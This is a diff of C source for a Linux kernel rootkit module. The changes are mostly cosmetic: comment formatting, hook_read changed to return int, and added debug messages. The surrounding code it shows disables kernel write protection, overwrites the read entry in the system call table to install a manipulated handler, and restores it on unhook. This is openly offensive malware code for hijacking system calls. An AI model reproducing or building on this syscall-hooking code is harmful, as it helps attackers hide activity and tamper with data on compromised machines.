@@ -90,10 +90,14 @@ manipulated_read (unsigned int fd, char __user *buf, size_t count)
 	return ret;
 }
 
-/* hooks the read system call */
-void hook_read(void)
+/*
+ * hooks the read system call
+ */
+int
+hook_read(void)
 {
 	ROOTKIT_DEBUG("Hooking read syscall...\n");
+
 	void **sys_call_table = (void *) sysmap_sys_call_table;
 	
 	/* disable write protection */
@@ -105,10 +109,17 @@ void hook_read(void)
 
 	/* reenable write protection */
 	enable_page_protection();
+
+	/* log and return */
+	ROOTKIT_DEBUG("Done.\n");
+	return 0;
 }
 
-/* unhooks read and returns the kernel to its regular state */
-void unhook_read(void)
+/*
+ *unhooks read and returns the kernel to its regular state
+ */
+void
+unhook_read(void)
 {
 	ROOTKIT_DEBUG("Restoring original read...\n");
 	
@@ -127,6 +138,7 @@ void unhook_read(void)
 	while(read_call_counter > 0) {
 		msleep(2);
 	}
-	
+
+	/* log and return */	
 	ROOTKIT_DEBUG("Done.\n");
 }
